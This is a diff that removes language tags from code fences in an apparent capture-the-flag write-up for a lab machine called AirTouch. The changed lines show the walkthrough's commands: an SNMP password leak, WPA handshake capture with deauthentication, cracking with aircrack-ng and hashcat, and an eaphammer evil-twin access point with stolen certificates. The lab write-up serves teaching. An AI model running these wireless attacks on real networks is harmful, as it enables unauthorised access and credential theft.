@@ -1,6 +1,6 @@
 # Initial Recon 
 
-```bash 
+```
 Nmap scan report for 10.129.244.98
 Host is up (0.12s latency).
 Not shown: 976 closed udp ports (port-unreach)
@@ -43,7 +43,7 @@ password revelad `RxBlZhLmOkacNWScmZ6D`
 
 doing an snmp walk gave us this 
 
-```bash 
+```
 snmpwalk -v2c -c public 10.129.244.98 
 iso.3.6.1.2.1.1.1.0 = STRING: "\"The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)\""
 iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
@@ -98,8 +98,8 @@ we found two picture showing the architecture of the network
 
 and on the `/etc/hosts` found these ip
 
-```bash 
- cat /etc/hosts
+```
+cat /etc/hosts
 127.0.0.1       localhost
 ::1     localhost ip6-localhost ip6-loopback
 fe00::  ip6-localnet
@@ -111,7 +111,7 @@ ff02::2 ip6-allrouters
 ```
 
 and investigating more finding a lot of ifaces are down 
-```bash 
+```
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
     inet 127.0.0.1/8 scope host lo
@@ -307,17 +307,17 @@ wlan0     Scan completed :
 we got the bssid `F0:9F:C2:A3:F1:A7` and we can now use aircrack-ng to capture a handshake 
 
 start the iface 
-```bash 
+```
 sudo airmon-ng start wlan0
 ```
 
 monitor the router 
-```bash 
+```
 sudo airodump-ng -c 6 --bssid F0:9F:C2:A3:F1:A7 -w capture wlan0mon
 ```
 
 on another ssh session send deauth packets 
-```bash 
+```
 sudo aireplay-ng -0 0 -a F0:9F:C2:A3:F1:A7 wlan0mon
 ```
 
@@ -328,7 +328,7 @@ until u see `EAPOL` means we deauthet the client connected to that network and w
 
 we dont have rockyout on the system so its easier to uplaod the file on our machine then we crack using airckrack 
 
-```bash 
+```
 aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
 ```
 
@@ -337,19 +337,19 @@ and we found it
 ![[Pasted image 20260222210510.png]]
 so here there was a compilcation at first . wpa_supplicant still in use even after u kill the monitor interface with 
 
-```bash 
+```
 airmon-ng stop wlan0mon 
 ```
 
 so u kill the process  
 
-```bash
+```
 sudo kill $(pgrep wpa_supplicant)
 ```
 
 initial a conenction file to connect to AirTouch-Internet
 
-```bash 
+```
 cat > wifi.conf << EOF 
 p2p_disabled=1 
 network={ 
@@ -364,7 +364,7 @@ EOF
 
 connect to it 
 
-```bash 
+```
 sudo ip link set wlan0 up
 sudo wpa_supplicant -B -i wlan0 -c wifi.conf -D nl80211 -C /tmp/wpa_ctrl
 sudo dhclient wlan0
@@ -378,7 +378,7 @@ we are connected soo .. since the machine have the aircrack tools we already the
 
 ## secon Recon
 
-```bash 
+```
 nmap -sV -sC --min-rate=5000 192.168.3.0/24 -oN nmap.txt 
 Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-22 20:22 UTC
 Nmap scan report for 192.168.3.1
@@ -412,7 +412,7 @@ Nmap done: 256 IP addresses (2 hosts up) scanned in 27.07 seconds
 
 we forward the port to us 
 
-```bash 
+```
 ssh -L 8080:192.168.3.1:80 consultant@10.129.244.98
 ```
 
@@ -422,7 +422,7 @@ and we access the router from the browser
 
 bruteforcing gave us nothing, but decrypting the .cap file we got earlier when we kicked out the user connecting to it 
 
-```bash
+```
 airdecap-ng -e "AirTouch-Internet" -p challenge capture-01.cap
 ```
 
@@ -471,7 +471,7 @@ after a lot of digging up those file found on  hte certs-backup need to be used 
 
 first of all copying all the files to the home dir 
 
-```bash 
+```
 mkdir /home/user/certs-backups 
 cp /root/certs-backup/* /home/user/certs-backups
 chown user /home/user/certs-backups  
@@ -479,13 +479,13 @@ chown user /home/user/certs-backups
 
 downloading them to consultant machine 
 
-```bash 
+```
 scp user@192.168.3.1:/home/user/cert-backup/* .
 ```
 
 then we `sudo su` and go to `eaphammer` folder and execter the binary with the correct files 
 
-```bash 
+```
 ./eaphammer --interface wlan2 \
  --channel 6 \
  --essid "AirTouch-Office" \
@@ -498,7 +498,7 @@ then we `sudo su` and go to `eaphammer` folder and execter the binary with the c
 
 we monitor the `AirTouch-Internet` station using one of the interfaces on another terrminal   
 
-```bash
+```
 sudo airmon-ng start wlan3 
 sudo airodump-ng --bssid F0:9F:C2:A3:F1:A7 wlan3mon 
 ```
@@ -506,13 +506,13 @@ sudo airodump-ng --bssid F0:9F:C2:A3:F1:A7 wlan3mon
 ![[Pasted image 20260224135650.png]]
 thats the tablet, now we quit the monotoring and kick it 
 
-```bash 
+```
 sudo aireplay-ng -0 0 -a F0:9F:C2:A3:F1:A7 wlan3mon
 ```
 
 well didnt work .. i investigated more and i found out i wasnt looking at all the bands to get the AirTouch-Office soo 
 
-```bash
+```
 sudo airodump-ng --band abg wlan3mon
 ```
 
@@ -521,13 +521,13 @@ this totally worked
 ![[Pasted image 20260224220509.png]]
 now we launch the server on channel 44 with that bssid 
 
-```bash 
+```
 ./eaphammer --interface wlan4 --channel 44 --essid "AirTouch-Office" --creds --auth wpa-eap --server-cert /home/consultant/certs-backups/server.crt --ca-cert /home/consultant/certs-backups/ca.crt --private-key /home/consultant/certs-backups/server.key --bssid AC:8B:A9:AA:3F:D2 
 ```
 
 we monitor that the office AP 
 
-```bash 
+```
 sudo airodump-ng --bssid AC:8B:A9:AA:3F:D2 --channel 44 --band a wlan3mon
 ```
 
@@ -535,7 +535,7 @@ sudo airodump-ng --bssid AC:8B:A9:AA:3F:D2 --channel 44 --band a wlan3mon
 
 and we deauth now 
 
-```bash 
+```
 sudo aireplay-ng -0 0 -a AC:8B:A9:AA:3F:D2 wlan3mon
 ```
 
@@ -543,7 +543,7 @@ sudo aireplay-ng -0 0 -a AC:8B:A9:AA:3F:D2 wlan3mon
 
 we got the NTLM , user `r4ulcl` , now we crack it 
 
-```bash 
+```
 echo "r4ulcl::::ed6d1e5664a4ed3761faa1b1c4764e364d1b3c5aa7cc334e:5c150746dd894c1d" > hash.txt
 hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt
 ```
@@ -552,7 +552,7 @@ hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt
 
 now we connect to airtouch-office 
 
-```bash 
+```
 cat > ~/certs-backups/corp.conf << 'EOF'
 p2p_disabled=1
 network={
@@ -575,7 +575,7 @@ sudo wpa_supplicant -i wlan0 -c ~/certs-backups/corp.conf -D nl80211
 
 we request an ip 
 
-```bash 
+```
  sudo dhclient wlan2 
 ```
 
@@ -583,7 +583,7 @@ we request an ip
 
 we nmap the subnet now 
 
-```bash 
+```
 Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-24 21:25 UTC
 tats: 0:00:08 elapsed; 0 hosts completed (0 up), 256 undergoing Ping Scan
 Parallel DNS resolution of 256 hosts. Timing: About 0.00% done
@@ -612,7 +612,7 @@ and we are in
 
 now the final phase . getting to root , we found another user `admin` , i went the thru the hustle of uploading linpeas to the new machine and found a critical hostapd file that stores the creds connected on the system 
 
-```bash
+```
 /etc/hostapd/hostapd_wpe.eap_usersu admin
 ```
 
